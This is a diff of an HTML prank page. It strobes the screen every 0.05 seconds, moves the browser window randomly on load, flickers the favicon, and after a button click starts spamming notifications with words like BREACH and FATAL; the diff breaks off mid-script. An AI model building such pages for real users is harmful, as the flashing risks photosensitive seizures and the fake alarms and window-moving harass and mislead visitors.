@@ -5,40 +5,43 @@
     <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
     <style>
         body { background: #000; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
-        
-        /* The Glitchbox background */
-        #box {
+        #glitchbox {
             position: fixed; width: 100%; height: 100%;
-            background: #fff;
-            animation: glitch-anim 0.05s infinite;
+            background: #fff; animation: pulse 0.05s infinite;
         }
-
-        @keyframes glitch-anim {
+        @keyframes pulse {
             0% { background: #fff; clip-path: inset(0 0 0 0); }
             50% { background: #000; clip-path: polygon(10% 0, 90% 0, 100% 100%, 0% 100%); }
-            100% { background: #888; clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%); }
+            100% { background: #444; clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%); }
         }
-
-        #msg { position: fixed; z-index: 10; top: 50%; left: 50%; transform: translate(-50%,-50%); }
-        button { padding: 15px; font-family: monospace; cursor: pointer; font-weight: bold; }
+        button { position: fixed; z-index: 99; top: 50%; left: 50%; transform: translate(-50%,-50%); padding: 20px; cursor: pointer; }
     </style>
 </head>
-<body>
+<body onload="autoMove()">
 
-    <div id="box"></div>
-    <div id="msg"><button onclick="startSpam()">INITIATE NOTIFS</button></div>
+    <div id="glitchbox"></div>
+    <button id="spawner" onclick="startSpam()">ACTIVATE NOTIFS</button>
 
     <script>
-        // 1. Glitchbox Favicon
+        // 1. Move window to random position automatically
+        function autoMove() {
+            setInterval(() => {
+                const x = Math.floor(Math.random() * (window.screen.availWidth - 400));
+                const y = Math.floor(Math.random() * (window.screen.availHeight - 400));
+                window.moveTo(x, y);
+            }, 600);
+        }
+
+        // 2. Glitchbox Favicon
         setInterval(() => {
             const p = () => Math.floor(Math.random() * 100);
             document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
         }, 50);
 
+        // 3. Notification Spammer
         const words = ["VOID", "NULL", "ERROR", "SIGNAL", "BREACH", "FATAL", "DATA", "LOST", "0x0", "STACK", "CORRUPT"];
-
         async function startSpam() {
-            document.getElementById('msg').style.display = 'none';
+            document.getElementById('spawner').style.display = 'none';
             const perm = await Notification.requestPermission();
             if (perm === 'granted') {
                 setInterval(() => {
